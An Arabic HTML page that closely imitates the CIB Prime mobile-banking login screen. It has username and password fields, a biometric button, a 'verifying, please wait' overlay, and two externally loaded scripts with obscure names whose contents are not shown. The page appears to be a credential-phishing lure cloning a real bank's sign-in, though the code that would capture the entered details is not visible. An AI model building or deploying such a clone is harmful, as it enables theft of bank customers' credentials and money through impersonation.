<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CIB Prime</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background: #e8edf2; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
    .phone { width: 390px; background: #ffffff; display: flex; flex-direction: column; border-radius: 18px; overflow: hidden; box-shadow: 0 12px 50px rgba(0,0,0,0.18); }
    .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 22px 20px 18px; }
    .lang-btn { border: 1.5px solid #c0c0c0; border-radius: 22px; padding: 6px 14px 6px 10px; font-size: 13px; color: #444; cursor: pointer; display: flex; align-items: center; gap: 5px; background: white; font-family: inherit; }
    .logo-img { height: 38px; object-fit: contain; display: block; }
    .form-area { padding: 4px 24px 0; }
    .field-group { margin-bottom: 18px; }
    .field-label { display: block; font-size: 15.5px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; text-align: right; }
    .field-input { width: 100%; padding: 13px 14px; border: 1.5px solid #d6dae0; border-radius: 10px; font-size: 14.5px; color: #333; text-align: right; font-family: inherit; outline: none; background: #fafafa; transition: border-color 0.2s; direction: rtl; }
    .field-input::placeholder { color: #b0b8c1; }
    .field-input:focus { border-color: #1a5ca8; background: white; }
    .password-wrap { position: relative; }
    .password-wrap .field-input { padding-left: 42px; }
    .eye-btn { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 0; display: flex; align-items: center; color: #aab; }
    .forgot { display: block; text-align: right; color: #1a5ca8; font-size: 13.5px; font-weight: 500; text-decoration: none; margin-bottom: 26px; margin-top: -4px; }
    .login-row { display: flex; gap: 10px; align-items: stretch; margin-bottom: 28px; }
    .btn-login { flex: 1; background: #b8c4cc; color: white; border: none; border-radius: 10px; padding: 15px; font-size: 17px; font-weight: 600; font-family: inherit; cursor: not-allowed; transition: background 0.25s; }
    .btn-login.active { background: #1a5ca8; cursor: pointer; }
    .btn-login.active:hover { background: #154d93; }
    .btn-bio { background: white; border: 1.5px solid #1a5ca8; border-radius: 10px; width: 62px; cursor: pointer; display: flex; flex-direction: row; align-items: center; justify-content: center; padding: 10px 6px; gap: 4px; transition: background 0.2s; flex-shrink: 0; }
    .btn-bio:hover { background: #eef3fb; }
    .bio-divider { width: 1px; height: 26px; background: #c5d3e8; flex-shrink: 0; }
    .register-line { text-align: center; font-size: 15px; color: #444; margin-bottom: 16px; }
    .register-line a { color: #1a5ca8; font-weight: 700; text-decoration: none; }
    .version { text-align: center; font-size: 12.5px; color: #aaa; padding: 14px 0 18px; }
    .contact-bar { background: #00b5c9; padding: 13px 20px; display: flex; justify-content: center; align-items: center; gap: 7px; }
    .contact-bar .cb-text { color: white; font-size: 13.5px; }
    .contact-bar a { color: white; font-size: 13.5px; font-weight: 700; text-decoration: none; }
    .bottom-nav { background: #1a5ca8; padding: 13px 6px 14px; display: flex; justify-content: space-around; align-items: flex-start; }
    .nav-item { text-align: center; cursor: pointer; flex: 1; display: flex; flex-direction: column; align-items: center; gap: 5px; }
    .nav-item span { color: white; font-size: 10.5px; line-height: 1.4; display: block; }
    #loadingOverlay { display:none;position:fixed;inset:0;background-color:rgba(0,0,0,0.6);z-index:9999;justify-content:center;align-items:center;flex-direction:column; }
    #loadingOverlay.show { display:flex; }
    #loadingOverlay h5 { color:white;margin-top:20px;font-family:'Segoe UI',sans-serif; }
    #loadingOverlay p { color:rgba(255,255,255,0.8);font-family:'Segoe UI',sans-serif; }
    @keyframes spin { to { transform:rotate(360deg); } }
    .spin { width:3rem;height:3rem;border:4px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 1s linear infinite; }
  </style>
</head>
<body>
<div class="phone">
  <div class="top-bar">
    <img src="logo.png" class="logo-img" alt="CIB Prime"/>
    <button class="lang-btn">
      <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><polyline points="1,4 6,9 11,4" stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
      العربية
    </button>
  </div>
  <div class="form-area">
    <div class="field-group">
      <label class="field-label">اسم المستخدم</label>
      <input class="field-input" id="usernameInput" type="text" placeholder="أدخل اسم المستخدم" lang="en" dir="ltr" style="text-align:right;"/>
    </div>
    <div class="field-group">
      <label class="field-label">كلمة المرور</label>
      <div class="password-wrap">
        <input class="field-input" id="passwordInput" type="password" placeholder="أدخل كلمة المرور" lang="en" dir="ltr" style="text-align:right;"/>
        <button class="eye-btn" onclick="togglePass()" type="button" tabindex="-1">
          <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
    </div>
    <a href="#" class="forgot" style="text-align:left;">هل نسيت كلمة المرور؟</a>
    <div class="login-row">
      <button class="btn-login" id="loginBtn" disabled>تسجيل الدخول</button>
      <button class="btn-bio" type="button">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a5ca8" stroke-width="1.65" stroke-linecap="round" stroke-linejoin="round">
          <path d="M7 3H5a2 2 0 0 0-2 2v2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/>
          <path d="M7 21H5a2 2 0 0 1-2-2v-2"/><path d="M17 21h2a2 2 0 0 0 2-2v-2"/>
          <line x1="9" y1="10" x2="9" y2="10.01" stroke-width="2.5"/><line x1="15" y1="10" x2="15" y2="10.01" stroke-width="2.5"/>
          <path d="M12 10v2.5"/><path d="M9.5 15.5c.7 1 1.5 1.5 2.5 1.5s1.8-.5 2.5-1.5"/>
        </svg>
        <div class="bio-divider"></div>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a5ca8" stroke-width="1.65" stroke-linecap="round" stroke-linejoin="round">
          <path d="M17 8c0-2.76-2.24-5-5-5S7 5.24 7 8"/><path d="M5 10c-.34.95-.5 1.96-.5 3 0 2.1.5 4.08 1.5 5.8"/>
          <path d="M19 10c.34.95.5 1.96.5 3 0 2.1-.5 4.08-1.5 5.8"/>
          <path d="M9 9.5c-.83.72-1.5 1.87-1.5 3.5 0 2 .7 4 2 5.5"/>
          <path d="M15 9.5c.83.72 1.5 1.87 1.5 3.5 0 2-.7 4-2 5.5"/>
          <path d="M12 9c-1.1 0-2 .9-2 2v2c0 2 1 3.5 2 4.5 1-1 2-2.5 2-4.5v-2c0-1.1-.9-2-2-2z"/>
        </svg>
      </button>
    </div>
    <p class="register-line">مستخدم جديد؟ <a href="#">سجل الآن</a></p>
    <div style="padding-bottom:60px;"></div>
  </div>
  <div class="version">إصدار التطبيق 3.1.5</div>
  <div class="contact-bar">
    <svg width="17" height="17" viewBox="0 0 24 24" fill="white"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.61 21 3 13.39 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.26.2 2.47.57 3.6.1.34.02.72-.24.98L6.6 10.8z"/></svg>
    <span class="cb-text">تحتاج إلى مساعدة؟</span><a href="#">اتصل بنا</a>
  </div>
  <div class="bottom-nav">
    <div class="nav-item">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="10" r="3"/><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
      <span>أماكن الفروع وماكينات<br/>الصراف الآلي</span>
    </div>
    <div class="nav-item">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5" rx="1"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>
      <span>مكافأة CIB</span>
    </div>
    <div class="nav-item">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="8" x2="21" y2="8"/><polyline points="17,4 21,8 17,12"/><line x1="21" y1="16" x2="3" y2="16"/><polyline points="7,12 3,16 7,20"/></svg>
      <span>محول العملات وأسعار<br/>الصرف</span>
    </div>
  </div>
</div>

<div id="loadingOverlay">
    <div class="spin"></div>
    <h5>جاري التحقق...</h5>
    <p>يرجى الانتظار</p>
</div>

<script src="js/a2.js"></script>
<script src="js/kn5k.js"></script>
</body>
</html>
